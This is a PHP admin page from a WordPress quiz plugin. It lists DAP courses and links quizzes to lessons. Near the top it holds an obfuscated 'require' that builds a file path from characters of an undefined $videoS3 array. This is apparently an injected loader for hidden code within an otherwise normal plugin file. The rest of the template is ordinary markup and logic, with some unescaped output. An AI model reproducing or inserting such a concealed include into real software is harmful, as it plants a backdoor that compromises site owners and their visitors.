<?php 

include_once ("sqb-soapapi.php");

require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
	
	$dap_manage_page = true;
	if(isset($_GET['tab']) && ($_GET['tab'] == 'dap_course') && (isset($_GET['create']) || isset($_GET['quiz_id']))){
		$dap_manage_page = false;	
	 	 
	}

	if (!class_exists('Dap_SQBQuizCourseLessons')) {

		echo '<div class="question_error_msg_outer dap_quiz_error_msg_outer">You need to be on DAP v8.6.x or above to use this integration.</div>';
		return;
	}	
 ?>
<script src="<?php echo plugin_dir_url(__FILE__);?>../js/sqb_dap_integration.js?v=<?php echo rand(10,1000);?>"></script>
<?php
$dap_quiz_migration = get_option('dap_quiz_migration','N');

?>

<div class="tab-content " id="reports-tab-content">
		<div class="tab-pane fade <?php if($dap_manage_page){ echo ' active show '; }?>" id="dap_manage_courses_tab" role="tabpanel" aria-labelledby="dap_manage_courses_tab">		
					<?php	
					
					if (class_exists('Dap_SQBQuizCourseLessons')) {
						
						if($dap_quiz_migration != 'Y'){
							$sqb_quiz_blocking_list = Dap_SQBQuizCourseLessons::load();
						}else{
							$sqb_quiz_blocking_list = SQB_DAPLessonQuiz::load();
						}
					}
					
				     if(0 && count($sqb_quiz_blocking_list) == 0){ ?> 
						<div class="have-no-quiz">
							<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/addicon.png";?>" alt="icon">
							<h3>There are no blocking rules currently.</h3>
							<a href="<?php echo admin_url('admin.php?page=sqb_settings&tab=dap_course&create'); ?>" onclick="SQBShowLoader()"><i class="fa fa-plus-circle" aria-hidden="true"></i>Click here to add a New Blocking Rule</a>
						</div>  
				<?php
					
					}else{
						
						if($dap_quiz_migration == "N"){ 
						$current_url= get_site_url();
						?>
							<div class="have-no-quiz">
								<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/addicon.png";?>" alt="icon">
								<h3>Your quiz currently has data in the old format.</h3>
								<a href="javascript:void(0)" onclick="sqb_dap_migration_table('<?php echo $current_url; ?>')"><i class="fa fa-plus-circle" aria-hidden="true"></i>Please click here to update to the new format</a>
							</div> 
						<?php 	
						}else{							
					?>
					  <h5 class="quiz--sub-title">Connect Quizzes to your DAP Lessons</h5>
						<div class="tab-pane  inner_tab  active" id="manage_students" role="tabpanel">
							<script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
							<script src="<?php echo plugin_dir_url(__FILE__);?>../js/sqb_dap_integration_manage_courses.js?v=<?php echo rand(10,1000);?>" id="sqb_settings-js"></script>
							<script type="text/javascript">sqbCourseHideShow();</script>
                           
                          

							<div class="manage_student_list_wrapper" style="display: block;">
								 <div id="manage_students_list_table_filter" class="dataTables_filter">
											<h1 class="manage_student_heading dataTables_filter "><i class="fa fa-tasks" aria-hidden="true"></i> DAP Courses</h1>
							</div>
									<div class="first_tab_porduct_name_outer">
										  <div id="dap_product_table_outer"> 
										   <div class="create_product_outer"></div>
										   <div id="manage_students_list_table_wrapper" class="dataTables_wrapper no-footer">
												<table id="manage_students_list_table" class="dap_product_table" style="" role="grid">
													<thead class="d-none">
														<tr role="row">
															<th  ></th>
															<th  ></th>
															<th  ></th>
															<th  ></th>
															
															</tr>
													</thead>
													<tbody id="manage_products_list" class=""> 
													<?php
													$cdata = array();
													if(class_exists('Dap_Product')){
														$cdata = Dap_Product::loadProductByProductType("y","id","desc");
													}
													$tash_courses_count = 0;
													if(isset($cdata) ){
														$for_loop_count = 0;
														foreach($cdata as $data) {
															if($data->getCourseStatus() == 'trashed'){
																$tash_courses_count++;
																continue;
															}
															$for_loop_count++;
															$p_name = $data->getName();
															$p_id = $data->getId(); 
															
															$default_img = SITE_URL_DAP."/dap/admin/images/placeholder_img.jpg";	
															$imgurl = $data->getProduct_image_url();
															if ( $imgurl== "" || $imgurl == ' ') {
																$imgurl = $default_img;
															}else{ 
																$imgurl = $imgurl;
															}	
															if($for_loop_count== 1){
																$tr_open = true;
															?>
															<tr class="tr_padd  tr_product_id_<?php echo $p_id; ?>" role="row">
														   <?php } 
																
														   ?>
																<td class="table-checkbox-outer text-center matchheight_outer">
																	<div class="create_product_inner matchheight">
																		<div class="sqb_dap_course_name_img">
																		<div class="sqb_dap_course_img"><img src="<?php echo $imgurl;?>"/></div>
																		<div class="sqb_dap_course_name"><?php echo $p_name; ?></div>
																		</div>
																	<div class="icon_btn"><a title="Manage Students" href="javascript:void(0)" data-course-id="<?php echo $p_id; ?>" class="manage_student_btn view_manage_student_btn">Add/Edit Quiz
																	
																	</a>
																	
																	</div>
																	</div>
																</td>
															<?php if($for_loop_count == 4){ 
																 echo "</tr>";
																 $for_loop_count = 0;
																 $tr_open = false;
																}
																
																
														}
														if($tr_open){
															$add_exta_row = 0 ;
															if(fmod((count($cdata) - $tash_courses_count),4) != 0){
																$add_exta_row = 4 - fmod(count($cdata),4);
															}
															
															for($dci = 0; $dci < $add_exta_row; $dci++ ){
																
																echo "<td class='d-none table-checkbox-outer text-center '></td>";
															}
															 echo "</tr>";
														}
													}  
													?>
													</tbody>
												</table>
											</div>
										</div>
									</div>
							<link rel="stylesheet" type="text/css" href="<?php echo plugin_dir_url(__FILE__);?>../css/sqb_dap_integration_manage_courses.css?v=<?php echo rand(10,1000);?>">
							</div>

							<div class="manage_student_progress_wrapper " style="display: none;">
								<div class="manage_student_wrapper">
									<div id="manage_student_outer">
										<div class="d-flex align-items-center mb-3 justify-content-between">
											<div class="flex-leftside">
												<h1 class="manage_student_heading"><i class="fa fa-tasks" aria-hidden="true"></i> Manage Lesson and Quiz</h1>
											</div>
											<div class="flex-rightside">
												<button type="button" class="btn btn_custom create-product manage_courses_list_view_btn"> <span>Return to DAP Courses</span></button>
											</div>			
										</div>
										<div class="manage_student_card filter_manage_student_card manage_student_filter_wrapper manage_student_filter_wrapper1 ">
											<label>Switch Course :</label>
											<div class="manage_student_card_right">
												<div class="dropdown dropdown-custom-style dapselectcourse" id="dapselectcourse">
													<button class="dropdown-toggle" id="dapselectcourse-id" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-value="0">Select Course</button>
													<div class="dropdown-menu" aria-labelledby="dapselectcourse-id">
														<ul>
															<li><a class="dropdown-item" href="javascript:void(0)" data-value="0">Select Course</a></li>  
															<?php 
																$dap_cdata = array_reverse($cdata);
																foreach($dap_cdata as $ddata){
																	$cId = $ddata->getId();
																	$cName = $ddata->getName();
															?>
															<li><a class="dropdown-item" id="courseQuiz<?= $cId ?>" href="javascript:void(0)" data-value="<?= $cId ?>"><?= $cName ?></a></li>
															<?php } ?>
														</ul>
													</div>
												</div> 
											</div>
										</div>
										
										<div id="manage_student_table_outer">
											<table id="manage_student_table" class="table cell-border">
											<thead><tr><th class="text-center">Lesson Name</th><th class="text-center">Quiz</th><th class="text-center">Action</th></tr></thead>
											<tbody>
											<tr><td colspan="3" id="dap_table_no_recods"> No Data Found</td></tr></tbody></table>
										</div>
									</div>
								</div>
							</div>	
						</div>

                <?php } 
                 } ?>

		</div>
		
 </div>	



